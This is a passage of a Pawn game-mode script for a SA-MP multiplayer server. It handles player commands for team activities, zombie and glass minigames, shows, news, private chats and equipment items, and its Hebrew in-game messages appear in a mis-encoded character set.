			strcat(string,str);
		}
		if(!staff) return SendClientMessage(playerid,red, " .рщя ыЄ· чс°щ Ўхх· ыььщ ючхс°щэ");
		ShowPlayerDialog(playerid,dialog_admins,DIALOG_STYLE_MSGBOX, @c(green) ":Ўхх· ф∙°·",string,"OK","");
		return 1;
	}
	for(new i = 0; i < sizeof(TeamActivities); i++) if(equal(cmd,TeamActivities[i][taCommand]))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			format(string,sizeof(string)," %s [action] :Ўх°ъ ф∙щюх∙",TeamActivities[i][taCommand]);
			SendClientMessage(playerid,white,string);
			format(string,sizeof(string)," %s state :фЁхычщ· %s сущў· юЎс ЇЄщьх· ф",TeamActivities[i][taCommand],TeamActivities[i][taName]);
			SendClientMessage(playerid,white,string);
			format(string,sizeof(string)," %s join :%s фЎш°Їх· ь",TeamActivities[i][taCommand],TeamActivities[i][taName]);
			SendClientMessage(playerid,white,string);
			format(string,sizeof(string)," %s quit :%s Ї°щ∙ф ю",TeamActivities[i][taCommand],TeamActivities[i][taName]);
			SendClientMessage(playerid,white,string);
			if(IsPlayerMAdmin(playerid))
			{
				format(string,sizeof(string)," %s start :%s ф·чь· ЇЄщьх·",TeamActivities[i][taCommand],TeamActivities[i][taName]);
				SendClientMessage(playerid,white,string);
				format(string,sizeof(string)," %s end [reason] :фЁхычщ· %s ёщхэ ЇЄщьх· ф",TeamActivities[i][taCommand],TeamActivities[i][taName]);
				SendClientMessage(playerid,white,string);
			}
			return 1;
		}
		if(equal(cmd,"state"))
		{
			if(teamactinfo[0] && teamactinfo[4] == i)
				if(teamactinfo[2] > 1) format(string,sizeof(string)," .хфщр ··чщь сЄху %d ∙Ёщх· %s щ∙ ы°тЄ ЇЄщьх·",teamactinfo[2],TeamActivities[i][taName]);
				else format(string,sizeof(string)," .хфщр ыс° ф·чщьф %s щ∙ ы°тЄ ЇЄщьх·",TeamActivities[i][taName]);
			else format(string,sizeof(string)," .%s рщя ы°тЄ ЇЄщьх·",TeamActivities[i][taName]);
			SendClientMessage(playerid,teamactinfo[0] ? green : red,string);
		}
		else if(equal(cmd,"join"))
		{
			if(!teamactinfo[0] || teamactinfo[4] != i)
			{
				format(string,sizeof(string)," .ы°тЄ %s рщя ЇЄщьх·",TeamActivities[i][taName]);
				return SendClientMessage(playerid,red,string);
			}
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][waitteamact]) return SendClientMessage(playerid,red," .фЇЄщьх· ··чщь сЄху ыюф ∙Ёщх·, рЁр фю·я сёсьЁх·");
			if(playerinfo[playerid][inteamact] && teamactinfo[4] == i)
			{
				format(string,sizeof(string)," .%s р·ф ыс° сЇЄщьх·",TeamActivities[i][taName]);
				return SendClientMessage(playerid,red,string);
			}
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .р·ф ыс° сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф срцх° ущ-рэ");
			if(!CanUseCommand(playerid)) return 1;
			if(teamactinfo[1] > TeamActivities[i][taMaxPlayers])
			{
				format(string,sizeof(string)," .·Їхёщэ %s ыь фюўхюх· с",TeamActivities[i][taName]);
				return SendClientMessage(playerid,red,string);
			}
			if(teamactinfo[2] <= 3) return SendClientMessage(playerid,red," .цюя ффЎш°Їх· Єс°");
			if(TeamActivities[i][taType] == 0)
			{
				playerinfo[playerid][waitteamact] = 1, playerinfo[playerid][teamactteam] = (teamactinfo[1] % 2) == 0 ? 1 : 2;
				playerinfo[playerid][teamactid] = teamactinfo[playerinfo[playerid][teamactteam] == 1 ? 5 : 6];
				teamactinfo[1]++, teamactinfo[playerinfo[playerid][teamactteam] == 1 ? 5 : 6]++;
				format(string,sizeof(string)," Х Х :%s фЎш°Ї· ьЇЄщьх· фўсхЎх· Х Х",TeamActivities[i][taName]);
				SendClientMessage(playerid,lightblue,string);
				SendClientMessage(playerid,purple," - р·ф ·ыЁё срхЇя рхшхюшщ ьўсхЎф ∙ф∙°· щсч° ьъ");
				format(string,sizeof(string)," - %s",TeamActivities[i][taText]);
				SendClientMessage(playerid,purple,string);
				format(string,sizeof(string)," Х фщЁъ ю·ч°ф юёЇ° " @c(white) "#%d",teamactinfo[1]);
				SendClientMessage(playerid,yellow,string);
				SendClientMessage(playerid,purple," ╗ !сфЎьчф");
			}
			else if(TeamActivities[i][taType] == 1)
			{
				playerinfo[playerid][clickon] = i;
				format(string,sizeof(string),"{%s}%s (%d)\n{%s}%s (%d)",HexStringOfColor(TeamActivities[i][taT1Color]),TeamActivities[i][taT1Name],teamactinfo[5],HexStringOfColor(TeamActivities[i][taT2Color]),TeamActivities[i][taT2Name],teamactinfo[6]);
				ShowPlayerDialog(playerid,dialog_teamact,DIALOG_STYLE_LIST,@c(lightblue) "счщ°· ўсхЎф ьЇЄщьх·",string,"счщ°ф","сщшхь");
			}
		}
		else if(equal(cmd,"quit"))
		{
			if(!teamactinfo[0] || teamactinfo[4] != i)
			{
				format(string,sizeof(string)," .ы°тЄ %s рщя ЇЄщьх·",TeamActivities[i][taName]);
				return SendClientMessage(playerid,red,string);
			}
			if(!playerinfo[playerid][inteamact])
			{
				format(string,sizeof(string)," .%s р·ф ьр сЇЄщьх·",TeamActivities[i][taName]);
				return SendClientMessage(playerid,red,string);
			}
			format(string,sizeof(string)," .%s Ї°∙· юфЇЄщьх·",TeamActivities[i][taName]);
			SendClientMessage(playerid,green,string);
			OutOfActivity(playerid);
		}
		else if(equal(cmd,"start"))
		{
			#if trainings == false
				if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			#endif
			if(!equal(GetName(playerid),"(gmR)Amit")) return SendClientMessage(playerid,red," ...щчцх° сў°хс");
			if(teamactinfo[0] && teamactinfo[4] == i)
			{
				format(string,sizeof(string)," .%s ыс° щ∙ ЇЄщьх· юёхт",TeamActivities[i][taName]);
				return SendClientMessage(playerid,red,string);
			}
			if(thereIsAct) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх· ЇхЄь·");
			StartTeamActivity(i);
		}
		else if(equal(cmd,"end"))
		{
			new reason[256];
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			if(!teamactinfo[0] || teamactinfo[4] != i)
			{
				format(string,sizeof(string)," .%s рщя ы°тЄ ЇЄщьх· юёхт",TeamActivities[i][taName]);
				return SendClientMessage(playerid,red,string);
			}
			reason = strrest(cmdtext,idx);
			if(!strlen(reason)) reason = "рщя";
			EndTeamActivity(reason,playerid);
		}
		else
		{
			format(string,sizeof(string)," .∙тхщф %s рЇ∙°х·",TeamActivities[i][taName]);
			SendClientMessage(playerid,red,string);
		}
		return 1;
	}
	if(equal(cmd,"/news"))
	{
		new string[M_S], fn[64], data[MAX_NEWS_LENGTH], views = 0;
		format(fn,sizeof(fn),folder_news "%d.txt",curNews);
		format(string,sizeof(string),"%dViews",curNews);
		views = fgetint(file_news,string);
		fsetint(file_news,string,++views);
		format(data,sizeof(data),"%s\n\n" @c(grey) "ЎЇщх· сЄуыхя цф: %d || Їх°ёэ с·р°щъ: %s\n/AllNews :ьЎЇщщф сЄуыхЁщэ рч°щэ",curNewsString,views,curNewsDate);
		format(string,sizeof(string),@c(lightblue) "(Єуыхя юё' %d (фЄуыхя фрч°хя",curNews);
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,string,data,"OK","");
		return 1;
	}
	if(equal(cmd,"/allnews"))
	{
		new string[M_S];
		format(string,sizeof(string),@c(grey) ":сч° юёЇ° Єуыхя ю-1 Єу %d ьфЎтф",curNews);
		ShowPlayerDialog(playerid,dialog_news,DIALOG_STYLE_INPUT,@c(lightblue) "ЄуыхЁщ ф∙°·",string,"счщ°ф","щЎщрф");
		return 1;
	}
	if(equal(cmd,"/scroll"))
	{
		if(playerinfo[playerid][scroll] == scroll_none) return SendClientMessage(playerid,red," .рщя ьъ ∙хэ ёў°хь");
		new string[M_S];
		format(string,sizeof(string),@c(blue) "ющуЄ Єь фёў°хь");
		if(playerinfo[playerid][scrollusing]) format(string,sizeof(string),"%s\n" @c(green) "фЇёў ∙щюх∙ сёў°хь",string);
		else format(string,sizeof(string),"%s\n" @c(green) "∙щюх∙ сёў°хь",string);
		format(string,sizeof(string),"%s\n" @c(red) "ючщў· ёў°хь",string);
		format(string,sizeof(string),"%s\n" @c(grey) "(Ёх·°х %d ∙Ёщх· ь∙щюх∙ сёў°хь)",string,playerinfo[playerid][scrolltime]);
		ShowPlayerDialog(playerid,dialog_scroll,DIALOG_STYLE_LIST,@c(lightblue) "рЇ∙°хщх· ёў°хь",string,"счщ°ф","ётх°");
		return 1;
	}
	if(equal(cmd,"/zombies"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /zombies [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /zombies state :фЎт· юЎс юьчю· фцхюсщэ фЁхычщ·");
			SendClientMessage(playerid,white," /zombies join :фЎш°Їх· ьюьчю· фцхюсщэ");
			SendClientMessage(playerid,white," /zombies quit :Ї°щ∙ф ююьчю· фцхюсщэ");
			if(IsPlayerMAdmin(playerid))
			{
				SendClientMessage(playerid,white," /zombies start :ф·чь· юьчюф чу∙ф");
				SendClientMessage(playerid,white," /zombies end [reason] :ёщхэ фюьчюф фЁхычщ·");
			}
			return 1;
		}
		if(equal(cmd,"state"))
		{
			if(zombiesinfo[0])
			{
				if(zombiesinfo[2] > 1)
				{
					format(string,sizeof(string)," .щ∙ ыЄ· юьчю· цхюсщэ хфщр ··чщь сЄху %d ∙Ёщх·",zombiesinfo[2]);
					SendClientMessage(playerid,green,string);
				}
				else SendClientMessage(playerid,green," .щ∙ ыЄ· юьчю· цхюсщэ хфщр ыс° ф·чщьф");
			}
			else SendClientMessage(playerid,red," .рщя ыЄ· юьчю· цхюсщэ");
		}
		else if(equal(cmd,"join"))
		{
			if(!zombiesinfo[0]) return SendClientMessage(playerid,red," .рщя юьчю· цхюсщэ ы°тЄ");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][waitzombies]) return SendClientMessage(playerid,red," .юьчю· фцхюсщэ ··чщь сЄху ыюф ∙Ёщх·, рЁр фю·я сёсьЁх·");
			if(playerinfo[playerid][inzombies]) return SendClientMessage(playerid,red," .р·ф ыс° сюьчю· фцхюсщэ");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .р·ф ыс° сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф срцх° ущ-рэ");
			if(!CanUseCommand(playerid)) return 1;
			if(zombiesinfo[1] >= MAX_ACTIVITY_PLAYERS) return SendClientMessage(playerid,red," .ыь фюўхюх· сюьчю· фцхюсщэ ·Їхёщэ");
			if(zombiesinfo[2] <= 3) return SendClientMessage(playerid,red," .цюя ффЎш°Їх· Єс°");
			if(GetMoney(playerid) < join_act) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє, фючщ° ьфЎш°Їх· ьЇЄщьх· фцх фхр " #join_act "$");
			ShowPlayerDialog(playerid,dialog_zombies,DIALOG_STYLE_LIST,@c(lightblue) "юьчю· фцхюсщэ - сч° Ё∙ў","MP5\nAK47","сч°","сщшхь");
		}
		else if(equal(cmd,"quit"))
		{
			if(!zombiesinfo[0]) return SendClientMessage(playerid,red," .рщя юьчю· цхюсщэ ы°тЄ");
			if(!playerinfo[playerid][inzombies]) return SendClientMessage(playerid,red," .р·ф ьр сюьчю· фцхюсщэ");
			SendClientMessage(playerid,green," .Ї°∙· ююьчю· фцхюсщэ");
			OutOfActivity(playerid);
		}
		else if(equal(cmd,"start"))
		{
			#if trainings == false
				if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			#endif
			if(zombiesinfo[0]) return SendClientMessage(playerid,red," .ыс° щ∙ юьчюф");
			if(thereIsAct) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх· ЇхЄь·");
			StartZombies();
		}
		else if(equal(cmd,"end"))
		{
			new reason[256];
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			if(!zombiesinfo[0]) return SendClientMessage(playerid,red," .рщя юьчюф ы°тЄ");
			reason = strrest(cmdtext,idx);
			if(!strlen(reason)) reason = "рщя";
			EndZombies(reason,playerid);
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· юьчю· цхюсщэ ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/sship"))
	{
		if(specialActivity != sa_sail) return SendClientMessage(playerid,red," .рщя ыЄ· фЇьтф");
		if(ssRoute >= 1) return SendClientMessage(playerid,red," .ффЇьтф ыс° фчьф, ьр Ёщ·я ьфЎш°є");
		if(!CanBeTeleported(playerid)) return 1;
		new rnd = random(sizeof(SailingShipSpawns));
		SetPlayerPos(playerid,SailingShipSpawns[rnd][0],SailingShipSpawns[rnd][1],SailingShipSpawns[rnd][2]+5.0);
		SetPlayerFacingAngle(playerid,SailingShipSpawns[rnd][3]);
		Streamer_Update(playerid);
		if(playerinfo[playerid][cantelep])
		{
			new string[M_S];
			format(string,sizeof(string)," + !фЎш°є ьфЇьтф %s",GetName(playerid));
			SendClientMessageToAll(lightblue,string);
			SetTimerEx("CanTeleP",30000,0,"ii",playerid,0);
			playerinfo[playerid][cantelep] = 0;
		}
		return 1;
	}
	if(equal(cmd,"/glass"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /glass [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /glass state :фЎт· юЎс ·ч°х· фтьрё фЁхычщ·");
			SendClientMessage(playerid,white," /glass join :фЎш°Їх· ь·ч°х· фтьрё");
			SendClientMessage(playerid,white," /glass quit :Ї°щ∙ф ю·ч°х· фтьрё");
			if(IsPlayerMAdmin(playerid))
			{
				SendClientMessage(playerid,white," /glass start :ф·чь· ·ч°х· тьрё чу∙ф");
				SendClientMessage(playerid,white," /glass end [reason] :ёщхэ ·ч°х· фтьрё фЁхычщ·");
			}
			return 1;
		}
		if(equal(cmd,"state"))
		{
			if(glassinfo[0])
			{
				if(glassinfo[2] > 1)
				{
					format(string,sizeof(string)," .щ∙ ыЄ· ·ч°х· тьрё хфщр ··чщь сЄху %d ∙Ёщх·",glassinfo[2]);
					SendClientMessage(playerid,green,string);
				}
				else SendClientMessage(playerid,green," .щ∙ ыЄ· ·ч°х· тьрё хфщр ыс° ф·чщьф");
			}
			else SendClientMessage(playerid,red," .рщя ыЄ· ·ч°х· тьрё");
		}
		else if(equal(cmd,"join"))
		{
			if(!glassinfo[0]) return SendClientMessage(playerid,red," .рщя ·ч°х· тьрё ы°тЄ");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][waitglass]) return SendClientMessage(playerid,red," .·ч°х· фтьрё ··чщь сЄху ыюф ∙Ёщх·, рЁр фю·я сёсьЁх·");
			if(playerinfo[playerid][inglass]) return SendClientMessage(playerid,red," .р·ф ыс° с·ч°х· фтьрё");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .р·ф ыс° сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф срцх° ущ-рэ");
			if(!CanUseCommand(playerid)) return 1;
			if(glassinfo[1] >= MAX_ACTIVITY_PLAYERS) return SendClientMessage(playerid,red," .ыь фюўхюх· с·ч°х· фтьрё ·Їхёщэ");
			if(glassinfo[2] <= 3) return SendClientMessage(playerid,red," .цюя ффЎш°Їх· Єс°");
			if(GetMoney(playerid) < join_act) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє, фючщ° ьфЎш°Їх· ьЇЄщьх· фхр " #join_act "$");
			GiveMoney(playerid,0-join_act,25);
			playerinfo[playerid][waitglass] = 1;
			glassinfo[1]++;
			SendClientMessage(playerid,lightblue," Х Х :фЎш°Ї· ь·ч°х· фтьрё Х Х");
			SendClientMessage(playerid,green," - юш°·ъ фщр ьфцф° юфцыхыщх· фЁхЇьх· хьф∙р° Єу ьцыхыщ· фрч°хЁф рх Єу ∙ыь ф∙чўЁщэ щЇьх");
			format(string,sizeof(string)," Х фщЁъ ю·ч°ф юёЇ° " @c(white) "#%d",glassinfo[1]);
			SendClientMessage(playerid,yellow,string);
			SendClientMessage(playerid,purple," ╗ !сфЎьчф");
		}
		else if(equal(cmd,"quit"))
		{
			if(!glassinfo[0]) return SendClientMessage(playerid,red," .рщя ·ч°х· тьрё ы°тЄ");
			if(!playerinfo[playerid][inglass]) return SendClientMessage(playerid,red," .р·ф ьр с·ч°х· фтьрё");
			SendClientMessage(playerid,green," .Ї°∙· ю·ч°х· фтьрё");
			OutOfActivity(playerid);
		}
		else if(equal(cmd,"start"))
		{
			#if trainings == false
				if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			#endif
			if(glassinfo[0]) return SendClientMessage(playerid,red," .ыс° щ∙ ·ч°х· тьрё");
			if(thereIsAct || actinfo[actExist]) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх·");
			StartGlass();
		}
		else if(equal(cmd,"end"))
		{
			new reason[256];
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			if(!glassinfo[0]) return SendClientMessage(playerid,red," .рщя тьрё ы°тЄ");
			reason = strrest(cmdtext,idx);
			if(!strlen(reason)) reason = "рщя";
			EndGlass(reason,playerid);
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· ·ч°х· тьрё ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/show"))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /show [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /show info :ющуЄ Єь ффхЇЄф фЁхычщ·");
			SendClientMessage(playerid,white," /show join :ыЁщёф ьфхЇЄф");
			SendClientMessage(playerid,white," /show quit :щЎщрф юффхЇЄф");
			SendClientMessage(playerid,white," /show list :°∙щю· ффхЇЄх· фўщщюх· с∙°·");
			if(IsPlayerMAdmin(playerid))
			{
				SendClientMessage(playerid,white," /show start [id] :ф·чь· фхЇЄф");
				SendClientMessage(playerid,white," /show end [reason] :ёщхэ фхЇЄф");
			}
			return 1;
		}
		new string[M_S];
		if(equal(cmd,"info"))
		{
			if(currentShow[0] == -1) SendClientMessage(playerid,red," .рщя фхЇЄф ы°тЄ");
			else SendShowInfo(playerid,currentShow[0],dialog_ni);
		}
		else if(equal(cmd,"join"))
		{
			if(currentShow[0] == -1) return SendClientMessage(playerid,red," .рщя фхЇЄф ы°тЄ");
			if(GetPlayerVirtualWorld(playerid) == world_show) return SendClientMessage(playerid,red," .р·ф ыс° сфхЇЄф");
			if(GetMoney(playerid) < showinfo[currentShow[0]][shwCost]) return SendClientMessage(playerid,red," .рщя ьъ ыёє ьўЁщщ· ы°шщё");
			if(!CanUseCommand(playerid)) return 1;
			SendShowInfo(playerid,currentShow[0],dialog_show);
		}
		else if(equal(cmd,"quit"))
		{
			if(currentShow[0] == -1) return SendClientMessage(playerid,red," .рщя фхЇЄф ы°тЄ");
			if(GetPlayerVirtualWorld(playerid) != world_show) return SendClientMessage(playerid,red," .р·ф ьр сфхЇЄф");
			SpawnPlayer(playerid);
			StopAudioStreamForPlayer(playerid);
			SendClientMessage(playerid,green," /Show Join :щЎр· юффхЇЄф, ьфЎш°Їх· счц°ф");
		}
		else if(equal(cmd,"list"))
		{
			new shList[1024];
			for(new i = 0; i < MAX_SHOWS; i++) if(showinfo[i][shwValid]) format(shList,sizeof(shList),!strlen(shList) ? ("%s{CCCCCC}[%02d:%02d] {00FF00}%s") : ("%s\n{CCCCCC}[%02d:%02d] {00FF00}%s"),shList,showinfo[i][shwLength][0],showinfo[i][shwLength][1],showinfo[i][shwName]);
			ShowPlayerDialog(playerid,dialog_showlist,DIALOG_STYLE_LIST,@c(lightblue) "°∙щю· ффхЇЄх·",shList,"Ї°шщэ","щЎщрф");
		}
		else if(equal(cmd,"start"))
		{
			if(playerinfo[playerid][admin] < 18) return SendClientMessage(playerid,red," .рщЁъ с°ю· рующя юёЇщў тсхфф");
			cmd = strtok(cmdtext,idx);
			if(currentShow[0] != -1) return SendClientMessage(playerid,red," .ыс° щ∙ фхЇЄф");
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /show start [show id] :Ўх°· ф∙щюх∙");
			new id = strval(cmd)-1;
			if(id < 0 || id > MAX_SHOWS-1 || !showinfo[id][shwValid]) return SendClientMessage(playerid,red," .юёЇ° фхЇЄф ∙тхщ");
			StartShow(id);
		}
		else if(equal(cmd,"end"))
		{
			if(playerinfo[playerid][admin] < 18) return SendClientMessage(playerid,red," .рщЁъ с°ю· рующя юёЇщў тсхфф");
			if(currentShow[0] == -1) return SendClientMessage(playerid,red," .рщя фхЇЄф ы°тЄ");
			cmd = strrest(cmdtext,idx);
			if(!strlen(cmd)) cmd = "рщя";
			format(string,sizeof(string)," :ёт° р· ффхЇЄф юфёщсф %s фрующя",GetName(playerid));
			SendClientMessageToAll(red,string);
			SendClientMessageToAll(red,cmd);
			EndShow();
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· фхЇЄф ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/border") || equal(cmd,"/bo"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .ь∙щюх∙ срхЇЎщщф цх Єьщъ ьфщх· °∙хэ хючхс° ь∙°·");
		if(!playerinfo[playerid][bordervis]) Border(playerid,"show");
		Border(playerid,"eselect");
		return 1;
	}
	if(equal(cmd,"/laser"))
	{
		if(!playerinfo[playerid][ammuitems][ai_laser]) return SendClientMessage(playerid,red," .рщя ьъ ьщщц°, Єь юЁ· ьф∙·ю∙ сЇўхуф фцх Єьщъ ьўЁх· ьщщц° ючЁх· фЁ∙ўщэ");
		if(IsPlayerAttachedObjectSlotUsed(playerid,aoslot_laser)) RemovePlayerAttachedObject(playerid,aoslot_laser);
		else
		{
			SetPlayerAttachedObject(playerid,aoslot_laser,18643,6);
			TakeAmmuItemAmmo(playerid,ai_laser,1);
		}
		return 1;
	}
	if(equal(cmd,"/jetp"))
	{
		if(!playerinfo[playerid][ammuitems][ai_jetpack]) return SendClientMessage(playerid,red," .рщя ьъ ·щў ёщьхя, Єь юЁ· ьф∙·ю∙ сЇўхуф фцх Єьщъ ьўЁх· ·щў ёщьхя ючЁх· фЁ∙ўщэ");
		if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK) return SendClientMessage(playerid,red," .р·ф ыс° ю∙·ю∙ с·щў ёщьхя");
		if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ючхї ь°ыс");
		if(GetPlayerInterior(playerid) != 0 || playerinfo[playerid][castle] != -1) return SendClientMessage(playerid,red," .рщЁъ щыхь ьсЎЄ р· фЇўхуф фцх сющўхюъ фЁхычщ");
		if(!CanUseCommand(playerid)) return 1;
		GiveJetpack(playerid);
		GameTextForPlayer(playerid,"~b~~h~fly ~h~like ~h~a ~h~bird~h~!",3000,4);
		TakeAmmuItemAmmo(playerid,ai_jetpack,1);
		return 1;
	}
	if(equal(cmd,"/bugarm"))
	{
		if(!playerinfo[playerid][ammuitems][ai_bugarmour]) return SendClientMessage(playerid,red," .рщя ьъ ютя сртщэ, Єь юЁ· ьф∙·ю∙ сЇўхуф фцх Єьщъ ьўЁх· ютя сртщэ ючЁх· фЁ∙ўщэ");
		playerinfo[playerid][bugarmour] = !playerinfo[playerid][bugarmour];
		SendClientMessage(playerid,playerinfo[playerid][bugarmour] ? green : red,playerinfo[playerid][bugarmour] ? (" .ютя фсртщэ фхЇЄь") : (" .ютя фсртщэ фхЇёў"));
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"BugArmour",playerinfo[playerid][bugarmour]);
		return 1;
	}
	if(equal(cmd,"/objectives"))
	{
		new dia[M_S_D];
		for(new i = 0; i < MAX_OBJECTIVES; i++) format(dia,sizeof(dia),!i ? ("%s%d) %s%s") : ("%s\n%d) %s%s"),dia,i+1,playerinfo[playerid][objective][i] ? ("[V] ") : (""),Objectives[i][obName]);
		ShowPlayerDialog(playerid,dialog_objectives,DIALOG_STYLE_LIST,@c(lightblue) "р·т°щэ",dia,"юш°ф","ётх°");
		return 1;
	}
	if(equal(cmd,"/chat"))
	{
		if(playerinfo[playerid][inchat] != INVALID_PLAYER_ID)
		{
			SendClientMessage(playerid,grey," (/quitchat ыущ ьЎр· юфЎ'рш сч° с\"рЇ∙°хщх·\" рх ф∙·ю∙ сЇўхуф)");
			playerinfo[playerid][minchat] = false;
			return Chat_Update(playerid);
		}
		chatinfo[playerid][chatValid] = true;
		format(chatinfo[playerid][chatTitle],32,"ььр ∙э");
		chatinfo[playerid][chatColor] = grey;
		chatinfo[playerid][chatManager] = playerid;
		playerinfo[playerid][inchat] = playerid;
		format(playerinfo[playerid][chatjointime],16,GetTimeAsString());
		format(chatinfo[playerid][chatCreationTime],16,playerinfo[playerid][chatjointime]);
		Chat_Write(playerid,".\"щЎ°· Ў'рш сфЎьчф. ыущ ьы·хс сх, Єьщъ ьфўьщу с·щс· фшўёш хььчхї \"∙ьч",false);
		Chat_Write(playerid,".\"ыущ ь∙Ёх· р· фых·°· ∙ь фЎ'рш, ьфцющя рьщх рЁ∙щэ хЄху ф°сф рЇ∙°хщх·, ьчї \"рЇ∙°хщх·");
		return 1;
	}
	if(equal(cmd,"/quitchat"))
	{
		if(playerinfo[playerid][inchat] == INVALID_PLAYER_ID) return SendClientMessage(playerid,red," .р·ф ьр ючхс° ьЎ'рш");
		if(playerinfo[playerid][indialog] >= dialog_chat && playerinfo[playerid][indialog] <= dialog_chatinvite) HidePlayerDialog(playerid);
		Chat_Quit(playerid,.msg = true);
		SendClientMessage(playerid,green,".щЎр· сфЎьчф юфЎ'рш");
		return 1;
	}
	if(equal(cmd, "/chatinvite"))
	{
		if(playerinfo[playerid][chatinvite] == INVALID_PLAYER_ID) return SendClientMessage(playerid, red, " .ьр фхцюЁ· ьЎ'рш рх ∙фЎ'рш ыс° ьр ўщщэ");
	    cmd = strtok(cmdtext, idx);
		if(!cmd[0]) return SendClientMessage(playerid, white, " /chatinvite [accept/cancel] :Ўх°· ф∙щюх∙");
		if(!equal(cmd, "accept") && !equal(cmd, "cancel")) return SendClientMessage(playerid, white, " /chatinvite [accept/cancel] :Ўх°· ф∙щюх∙");
		new cid = playerinfo[playerid][chatinvite], string[M_S];
		if(equal(cmd, "accept"))
		{
			Chat_Join(playerid,cid);
			playerinfo[playerid][chatinvite] = INVALID_PLAYER_ID;
			format(string,sizeof(string),"рщ∙° р· ффцюЁф хфЎш°є ьЎ'рш %s",GetName(playerid));
		}
		else format(string,sizeof(string),"учф р· ффцюЁф ьЎ'рш %s",GetName(playerid));
		Chat_Write(cid,string);
		return 1;
	}
	if(equal(cmd,"/bc"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /bc [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /bc state :фЎт· юЎс ЇЄщьх· фюцххуф фЁхычщ·");
			SendClientMessage(playerid,white," /bc join :фЎш°Їх· ьЇЄщьх· фюцххуф");
			SendClientMessage(playerid,white," /bc quit :Ї°щ∙ф юЇЄщьх· фюцххуф");
			if(IsPlayerMAdmin(playerid))
			{
				SendClientMessage(playerid,white," /bc start :ф·чь· ЇЄщьх· юцххуф чу∙ф");
				SendClientMessage(playerid,white," /bc end [reason] :ёщхэ ЇЄщьх· фюцххуф фЁхычщ·");
			}
			return 1;
		}
		if(equal(cmd,"state"))
		{
			if(briefcaseinfo[0])
			{
				if(briefcaseinfo[2] > 1)
				{
